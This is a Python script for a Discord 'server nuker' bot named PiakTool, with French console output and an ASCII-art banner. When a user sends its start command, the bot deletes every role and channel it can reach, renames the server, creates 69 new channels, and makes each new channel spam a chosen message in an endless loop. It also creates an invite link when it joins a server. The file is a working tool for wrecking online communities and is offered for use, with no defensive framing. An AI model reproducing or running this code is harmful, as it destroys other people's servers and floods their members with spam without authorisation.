import discord
import datetime
from discord.ext import commands
import asyncio
import time
import colored
from colored import fg
from pystyle import Write, System, Colors, Colorate, Anime
from colorama import *

async def get_time_rn():
    return time.strftime("%H:%M:%S", time.gmtime())

async def server_nuker(bot_token, message, channel_names, role_names):
    prefix = "!"
    guild_name = "PiakTool est ici"
    PIAKtool_bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
    PIAKtool_bot.remove_command('help')

    @PIAKtool_bot.event
    async def on_ready():
        System.Clear()
        a = discord.Game(name="PiakTool est ici", type=3)
        await PIAKtool_bot.change_presence(status=discord.Status.dnd, activity=a)
        print(Colorate.Horizontal(Colors.yellow_to_red, """
quu..__
 $$$b  `---.__
  "$$b        `--.                          ___.---uuudP
   `$$b           `.__.------.__     __.---'      $$$$"              .
     "$b          -'            `-.-'            $$$"              .'|
       ".                                       d$"             _.'  |
         `.   /                              ..."             .'     |
           `./                           ..::-'            _.'       |
            /                         .:::-'            .-'         .'
           :                          ::''\          _.'            |
          .' .-.             .-.           `.      .'               |
          : /'$$|           .@"$\           `.   .'              _.-'
         .'|$u$$|          |$$,$$|           |  <            _.-'
         | `:$$:'          :$$$$$:           `.  `.       .-'
         :                  `"--'             |    `-.     |
        :##.       ==             .###.       `.      `.    `|
        |##:                      :###:        |        >     > Piak Server Nuker
        |#'     `..'`..'          `###'        x:      /     /
         \                                   xXX|     /    ./
          \                                xXXX'|    /   ./
          /`-.                                  `.  /   /
         :    `-  ...........,                   | /  .'
         |         ``:::::::'       .            |<    `.
         |             ```          |           x| \ `.:``.
         |                         .'    /'   xXX|  `:`M`M':.
         |    |                    ;    /:' xXXX'|  -'MMMMM:'
         `.  .'                   :    /:'       |-'MMMM.-'
          |  |                   .'   /'        .'MMM.-'
          `'`'                   :  ,'          |MMM<
            |                     `'            |tbap|
             \                                  :MM.-'
              \                 |              .''
               \.               `.            /
                /     .:::::::.. :           /
               |     .:::::::::::`.         /
               |   .:::------------\       /
              /   .''               >::'  /
              `',:                 :    .'
                                   `:.:' """))
                         
        print(f"""
Connected : {PIAKtool_bot.user}
Envoyez : !PIAK_start dans un salon pour lancer l'attaque.\n\n""")

    @PIAKtool_bot.event
    async def on_guild_channel_create(channel):
        while True:
            await channel.send(message)
            time_rn = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[ {time_rn} ] (+) Sent Message ---> {message}")

    @PIAKtool_bot.event
    async def on_guild_join(guild):
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite = await channel.create_invite()
                break

    @PIAKtool_bot.command()
    async def PIAK_start(ctx):
        await ctx.message.delete()
        await ctx.guild.edit(name=guild_name)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                time_rn = await get_time_rn()
                print(f"[ {time_rn} ] (+) Rôle Supprimé ---> {role.name}")
            except:
                time_rn = await get_time_rn()
                print(f"[ {time_rn} ] (-) Échec de la suppression du rôle ---> {role.name}")

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                time_rn = await get_time_rn()
                print(f"[ {time_rn} ] (+) Salon Supprimée ---> #{channel.name}")
            except:
                time_rn = await get_time_rn()
                print(f"[ {time_rn} ] (-) Échec de la suppression du salon ---> #{channel.name}")

        try:
            for i in range(69):
                await ctx.guild.create_text_channel(channel_names)
                time_rn = await get_time_rn()
                print(f"[ {time_rn} ] (+) Salon Créé ---> #{channel_names}")
        except Exception:
            time_rn = await get_time_rn()
            print(f"[ {time_rn} ] (-) Échec de la création du salon ---> #{channel_names}")

    try:
        await PIAKtool_bot.start(bot_token)
    except Exception as e:
        print(f"An error occurred: {e}")

async def main():
    Write.Print(f"\nroot@bot_token ~> ", Colors.purple_to_red, interval=0.000); bot_token = input()
    Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); message = input()
    Write.Print(f"root@channel_names ~> ", Colors.purple_to_red, interval=0.000); channel_names = input()
    Write.Print(f"root@role_names ~> ", Colors.purple_to_red, interval=0.000); role_names = input()

    await server_nuker(bot_token, message, channel_names, role_names)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())